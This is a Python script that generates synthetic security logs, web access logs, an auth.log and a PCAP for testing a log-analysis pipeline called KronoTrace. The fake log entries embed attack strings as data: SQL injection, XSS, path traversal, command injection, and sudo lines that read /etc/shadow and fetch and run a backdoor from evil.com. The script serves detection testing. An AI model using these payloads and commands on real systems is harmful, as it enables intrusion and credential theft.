"""Generate realistic sample log files for testing the KronoTrace pipeline."""
import csv
import random
import os
import struct
import time
from datetime import datetime, timedelta, timezone

OUTPUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'sample_data')
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ─── Sample CSV: Security Events with a Brute Force Attack ───────────────────

def generate_security_csv():
    """Generate a CSV with auth events including a brute force attack pattern."""
    filepath = os.path.join(OUTPUT_DIR, 'security_events.csv')
    base_time = datetime(2026, 4, 10, 8, 0, 0, tzinfo=timezone.utc)

    users = ['admin', 'jsmith', 'root', 'svc_backup', 'dba_user']
    attacker_ip = '185.220.101.42'
    normal_ips = ['10.0.1.50', '10.0.1.51', '10.0.2.100', '192.168.1.10', '10.0.3.25']
    workstations = ['WS-FINANCE-01', 'SRV-DC-01', 'WS-HR-02', 'SRV-DB-01', 'WS-IT-03']
    app_names = ['ActiveDirectory', 'Nginx', 'Apache', 'MySQL', 'PostgreSQL', 'GitLab', 'Redis', 'Docker', 'Kubernetes', 'IIS']

    rows = []

    # Normal activity (first hour)
    for i in range(40):
        t = base_time + timedelta(minutes=random.randint(0, 60), seconds=random.randint(0, 59))
        ip = random.choice(normal_ips)
        user = random.choice(users)
        app = random.choice(app_names)
        rows.append({
            'timestamp': t.isoformat(),
            'event_id': random.choice(['4624', '4624', '4634', '4688', '4689']),
            'severity': 'info',
            'category': 'authentication',
            'source_ip': ip,
            'username': user,
            'message': f'Successful logon from {ip} to 192.168.1.100 port {random.choice([80, 443, 8080, 3389])} for user {user} via App {app}',
            'hostname': random.choice(workstations),
        })

    # Brute force attack: 15 failed logins in 2 minutes from attacker IP
    attack_start = base_time + timedelta(hours=1, minutes=23)
    for i in range(15):
        t = attack_start + timedelta(seconds=random.randint(0, 120))
        app = random.choice(app_names)
        rows.append({
            'timestamp': t.isoformat(),
            'event_id': '4625',
            'severity': 'high',
            'category': 'authentication',
            'source_ip': attacker_ip,
            'username': 'admin',
            'message': f'Failed logon attempt from {attacker_ip} to 192.168.1.100 port 3389 for user admin (bad password) via App {app}',
            'hostname': 'SRV-DC-01',
        })

    # Attacker succeeds after brute force
    success_time = attack_start + timedelta(minutes=3)
    app_success = random.choice(app_names)
    rows.append({
        'timestamp': success_time.isoformat(),
        'event_id': '4624',
        'severity': 'info',
        'category': 'authentication',
        'source_ip': attacker_ip,
        'username': 'admin',
        'message': f'Successful logon from {attacker_ip} to 192.168.1.100 port 3389 for user admin via App {app_success}',
        'hostname': 'SRV-DC-01',
    })

    # Privilege escalation: attacker gets special privileges
    rows.append({
        'timestamp': (success_time + timedelta(seconds=5)).isoformat(),
        'event_id': '4672',
        'severity': 'medium',
        'category': 'authentication',
        'source_ip': attacker_ip,
        'username': 'admin',
        'message': f'Special privileges assigned to admin from {attacker_ip}',
        'hostname': 'SRV-DC-01',
    })

    # Post-compromise: attacker creates a backdoor account
    rows.append({
        'timestamp': (success_time + timedelta(minutes=2)).isoformat(),
        'event_id': '4720',
        'severity': 'high',
        'category': 'system',
        'source_ip': attacker_ip,
        'username': 'admin',
        'message': f'New user account "svc_update" created by admin from {attacker_ip}',
        'hostname': 'SRV-DC-01',
    })

    # Attacker adds backdoor to admin group
    rows.append({
        'timestamp': (success_time + timedelta(minutes=2, seconds=30)).isoformat(),
        'event_id': '4732',
        'severity': 'high',
        'category': 'system',
        'source_ip': attacker_ip,
        'username': 'admin',
        'message': 'User "svc_update" added to Administrators group',
        'hostname': 'SRV-DC-01',
    })

    # Attacker password reset
    rows.append({
        'timestamp': (success_time + timedelta(minutes=3)).isoformat(),
        'event_id': '4724',
        'severity': 'high',
        'category': 'authentication',
        'source_ip': attacker_ip,
        'username': 'admin',
        'message': 'Password reset for account "svc_update"',
        'hostname': 'SRV-DC-01',
    })

    # Bulk file access (data harvesting)
    harvest_time = success_time + timedelta(minutes=5)
    for i in range(20):
        t = harvest_time + timedelta(seconds=i * 3)
        rows.append({
            'timestamp': t.isoformat(),
            'event_id': '4663',
            'severity': 'info',
            'category': 'file_access',
            'source_ip': attacker_ip,
            'username': 'admin',
            'message': f'Object access: C:\\Confidential\\financial_report_{i+1}.xlsx',
            'hostname': 'SRV-DC-01',
        })

    # More normal activity after
    for i in range(20):
        t = base_time + timedelta(hours=2, minutes=random.randint(0, 60))
        ip = random.choice(normal_ips)
        user = random.choice(users[1:])
        app = random.choice(app_names)
        rows.append({
            'timestamp': t.isoformat(),
            'event_id': random.choice(['4624', '4634', '4688']),
            'severity': 'info',
            'category': 'authentication',
            'source_ip': ip,
            'username': user,
            'message': f'Normal activity from {ip} for {user} via App {app}',
            'hostname': random.choice(workstations),
        })

    # Sort by time
    rows.sort(key=lambda r: r['timestamp'])

    with open(filepath, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=[
            'timestamp', 'event_id', 'severity', 'category',
            'source_ip', 'username', 'message', 'hostname'
        ])
        writer.writeheader()
        writer.writerows(rows)

    print(f"[+] Generated {filepath} ({len(rows)} events)")
    return filepath


def generate_web_attack_logs():
    """Generate a CSV with web access logs containing AI-detectable attack patterns."""
    filepath = os.path.join(OUTPUT_DIR, 'web_access.csv')
    base_time = datetime(2026, 4, 10, 9, 30, 0, tzinfo=timezone.utc)
    attacker_ip = '185.220.101.42'
    victim_server = '10.0.1.100'
    
    rows = []
    
    # Benign traffic
    for i in range(20):
        t = base_time + timedelta(seconds=i * 15)
        rows.append({
            'timestamp': t.isoformat(),
            'event_id': 'WEB_GET',
            'severity': 'info',
            'category': 'network',
            'source_ip': f'10.0.2.{10+i}',
            'username': '-',
            'message': f'GET /index.html HTTP/1.1 200 - via App Nginx',
            'hostname': 'WEB-SRV-01',
        })

    # AI-detectable attacks
    attacks = [
        ("SQL Injection", f"GET /product?id=1' OR '1'='1 HTTP/1.1 200 - via App Nginx"),
        ("XSS Attack", f"POST /search?q=<script>alert('pwned')</script> HTTP/1.1 200 - via App Nginx"),
        ("Path Traversal", f"GET /download?file=../../../../etc/passwd HTTP/1.1 403 - via App Nginx"),
        ("Command Injection", f"POST /ping?ip=127.0.0.1; whoami HTTP/1.1 200 - via App Nginx"),
        ("SQL Injection", f"POST /login?user=admin' -- HTTP/1.1 401 - via App Nginx"),
    ]

    attack_time = base_time + timedelta(minutes=10)
    for i, (name, msg) in enumerate(attacks):
        t = attack_time + timedelta(seconds=i * 5)
        rows.append({
            'timestamp': t.isoformat(),
            'event_id': 'WEB_ATTACK',
            'severity': 'medium',
            'category': 'network',
            'source_ip': attacker_ip,
            'username': '-',
            'message': msg,
            'hostname': 'WEB-SRV-01',
        })

    with open(filepath, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=[
            'timestamp', 'event_id', 'severity', 'category',
            'source_ip', 'username', 'message', 'hostname'
        ])
        writer.writeheader()
        writer.writerows(rows)

    print(f"[+] Generated {filepath} ({len(rows)} events)")
    return filepath


# ─── Sample Syslog: auth.log with SSH brute force ────────────────────────────

def generate_auth_log():
    """Generate an auth.log file with SSH brute force and privilege escalation."""
    filepath = os.path.join(OUTPUT_DIR, 'auth.log')
    base_time = datetime(2026, 4, 10, 8, 0, 0)
    attacker_ip = '185.220.101.42'
    normal_ips = ['10.0.1.50', '10.0.2.100']

    lines = []

    # Normal SSH activity
    for i in range(15):
        t = base_time + timedelta(minutes=random.randint(0, 50))
        ip = random.choice(normal_ips)
        ts = t.strftime('%b %d %H:%M:%S')
        user = random.choice(['jsmith', 'deploy', 'monitor'])
        lines.append((t, f'{ts} web-srv-01 sshd[{random.randint(1000,9999)}]: Accepted publickey for {user} from {ip} port {random.randint(40000,60000)} ssh2'))

    # Normal PAM sessions
    for i in range(10):
        t = base_time + timedelta(minutes=random.randint(0, 50))
        ts = t.strftime('%b %d %H:%M:%S')
        user = random.choice(['jsmith', 'deploy'])
        lines.append((t, f'{ts} web-srv-01 sshd[{random.randint(1000,9999)}]: pam_unix(sshd:session): session opened for user {user}(uid=1001) by (uid=0)'))

    # SSH brute force attack
    attack_start = base_time + timedelta(hours=1, minutes=23)
    for i in range(20):
        t = attack_start + timedelta(seconds=random.randint(0, 90))
        ts = t.strftime('%b %d %H:%M:%S')
        target_user = random.choice(['root', 'admin', 'ubuntu', 'test'])
        lines.append((t, f'{ts} web-srv-01 sshd[{random.randint(1000,9999)}]: Failed password for invalid user {target_user} from {attacker_ip} port {random.randint(40000,60000)} ssh2'))

    # Attacker eventually gets in
    success_time = attack_start + timedelta(minutes=4)
    ts = success_time.strftime('%b %d %H:%M:%S')
    pid = random.randint(1000, 9999)
    lines.append((success_time, f'{ts} web-srv-01 sshd[{pid}]: Accepted password for root from {attacker_ip} port 55123 ssh2'))
    lines.append((success_time + timedelta(seconds=1), f'{(success_time + timedelta(seconds=1)).strftime("%b %d %H:%M:%S")} web-srv-01 sshd[{pid}]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)'))

    # Attacker runs sudo commands
    sudo_time = success_time + timedelta(minutes=1)
    lines.append((sudo_time, f'{sudo_time.strftime("%b %d %H:%M:%S")} web-srv-01 sudo[{random.randint(1000,9999)}]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/shadow'))
    lines.append((sudo_time + timedelta(seconds=10), f'{(sudo_time + timedelta(seconds=10)).strftime("%b %d %H:%M:%S")} web-srv-01 sudo[{random.randint(1000,9999)}]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/backdoor.sh'))
    lines.append((sudo_time + timedelta(seconds=20), f'{(sudo_time + timedelta(seconds=20)).strftime("%b %d %H:%M:%S")} web-srv-01 sudo[{random.randint(1000,9999)}]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash /tmp/backdoor.sh'))

    # Systemd events
    for i in range(5):
        t = base_time + timedelta(hours=random.randint(0, 2), minutes=random.randint(0, 59))
        ts = t.strftime('%b %d %H:%M:%S')
        service = random.choice(['nginx', 'mysql', 'redis', 'cron'])
        action = random.choice(['Started', 'Stopped'])
        lines.append((t, f'{ts} web-srv-01 systemd[1]: {action} {service}.service'))

    # Sort and write
    lines.sort(key=lambda x: x[0])

    with open(filepath, 'w', encoding='utf-8') as f:
        for _, line in lines:
            f.write(line + '\n')

    print(f"[+] Generated {filepath} ({len(lines)} lines)")
    return filepath


# ─── Sample PCAP: Network Traffic Generation ─────────────────────────────────

PCAP_MAGIC = 0xA1B2C3D4
PCAP_VERSION_MAJOR = 2
PCAP_VERSION_MINOR = 4
PCAP_THISZONE = 0
PCAP_SIGFIGS = 0
PCAP_SNAPLEN = 65535
PCAP_LINKTYPE_ETHERNET = 1

def write_pcap_header(f):
    f.write(struct.pack('<I', PCAP_MAGIC))
    f.write(struct.pack('<H', PCAP_VERSION_MAJOR))
    f.write(struct.pack('<H', PCAP_VERSION_MINOR))
    f.write(struct.pack('<i', PCAP_THISZONE))
    f.write(struct.pack('<I', PCAP_SIGFIGS))
    f.write(struct.pack('<I', PCAP_SNAPLEN))
    f.write(struct.pack('<I', PCAP_LINKTYPE_ETHERNET))

def ip_to_bytes(ip_str):
    return bytes(int(x) for x in ip_str.split('.'))

def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def build_tcp_packet(src_ip, dst_ip, src_port, dst_port, flags=0x02, payload=b'', seq=0, ack=0):
    eth_dst = b'\x00\x11\x22\x33\x44\x55'
    eth_src = b'\x66\x77\x88\x99\xaa\xbb'
    eth_type = struct.pack('!H', 0x0800)
    eth_header = eth_dst + eth_src + eth_type

    tcp_header = (
        struct.pack('!H', src_port) +
        struct.pack('!H', dst_port) +
        struct.pack('!I', seq) +
        struct.pack('!I', ack) +
        struct.pack('!H', (5 << 12) | flags) +
        struct.pack('!H', 65535) +
        struct.pack('!H', 0) +
        struct.pack('!H', 0)
    )

    ip_total_len = 20 + len(tcp_header) + len(payload)
    ip_header = struct.pack('!BBHHHBBH',
        0x45, 0, ip_total_len,
        random.randint(1, 65535), 0x4000, 64, 6, 0
    ) + ip_to_bytes(src_ip) + ip_to_bytes(dst_ip)

    ip_csum = checksum(ip_header)
    ip_header = ip_header[:10] + struct.pack('!H', ip_csum) + ip_header[12:]

    return eth_header + ip_header + tcp_header + payload

def build_udp_packet(src_ip, dst_ip, src_port, dst_port, payload=b''):
    eth_dst = b'\x00\x11\x22\x33\x44\x55'
    eth_src = b'\x66\x77\x88\x99\xaa\xbb'
    eth_type = struct.pack('!H', 0x0800)
    eth_header = eth_dst + eth_src + eth_type

    udp_header = struct.pack('!HHHH', src_port, dst_port, 8 + len(payload), 0)

    ip_total_len = 20 + len(udp_header) + len(payload)
    ip_header = struct.pack('!BBHHHBBH',
        0x45, 0, ip_total_len,
        random.randint(1, 65535), 0x4000, 64, 17, 0
    ) + ip_to_bytes(src_ip) + ip_to_bytes(dst_ip)

    ip_csum = checksum(ip_header)
    ip_header = ip_header[:10] + struct.pack('!H', ip_csum) + ip_header[12:]

    return eth_header + ip_header + udp_header + payload

def write_packet(f, packet_data, timestamp):
    ts_sec = int(timestamp)
    ts_usec = int((timestamp - ts_sec) * 1_000_000)
    cap_len = len(packet_data)

    f.write(struct.pack('<I', ts_sec))
    f.write(struct.pack('<I', ts_usec))
    f.write(struct.pack('<I', cap_len))
    f.write(struct.pack('<I', cap_len))
    f.write(packet_data)

def generate_pcap(output_path):
    random.seed(42)

    base_time = time.time() - 7200
    current_time = base_time

    INTERNAL_SERVER = '192.168.1.10'
    INTERNAL_WS1 = '192.168.1.50'
    INTERNAL_WS2 = '192.168.1.51'
    INTERNAL_DNS = '192.168.1.1'
    ATTACKER_IP = '45.33.49.119'
    ATTACKER_IP2 = '185.220.101.34'
    EXFIL_SERVER = '103.224.182.250'
    LEGIT_EXTERNAL = '142.250.190.78'

    packets = []

    print("[*] Generating traffic...")

    for i in range(20):
        t = current_time + random.uniform(0, 60)
        pkt = build_udp_packet(INTERNAL_WS1, INTERNAL_DNS, random.randint(49152, 65535), 53, b'\x00'*30)
        packets.append((t, pkt))

    current_time += 60

    for port in [22, 80, 443]:
        t = current_time + random.uniform(0, 5)
        pkt = build_tcp_packet(ATTACKER_IP, INTERNAL_SERVER, random.randint(40000, 60000), port)
        packets.append((t, pkt))

    current_time += 10

    for i in range(10):
        t = current_time + i
        pkt = build_tcp_packet(ATTACKER_IP, INTERNAL_SERVER, random.randint(40000, 60000), 22)
        packets.append((t, pkt))

    packets.sort(key=lambda x: x[0])

    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    with open(output_path, 'wb') as f:
        write_pcap_header(f)
        for ts, pkt_data in packets:
            write_packet(f, pkt_data, ts)

    print(f"[+] Generated {output_path} ({len(packets)} packets)")
    return output_path


# ─── Generate All ─────────────────────────────────────────────────────────────

if __name__ == '__main__':
    print("Generating sample test data for KronoTrace...\n")
    csv_path = generate_security_csv()
    web_path = generate_web_attack_logs()
    log_path = generate_auth_log()
    pcap_path = os.path.join(OUTPUT_DIR, 'attack_traffic.pcap')
    generate_pcap(pcap_path)
    print(f"\n[DONE] Sample data ready in {OUTPUT_DIR}/")
    print(f"   - {os.path.basename(csv_path)} (Security events CSV with brute force + privilege escalation)")
    print(f"   - {os.path.basename(web_path)} (Web access logs with SQLi, XSS, etc. for AI detection)")
    print(f"   - {os.path.basename(log_path)} (auth.log with SSH attack)")
    print(f"   - {os.path.basename(pcap_path)} (Network PCAP with port scan and brute force)")
    print(f"\nUpload all files to KronoTrace to see the full pipeline in action!")
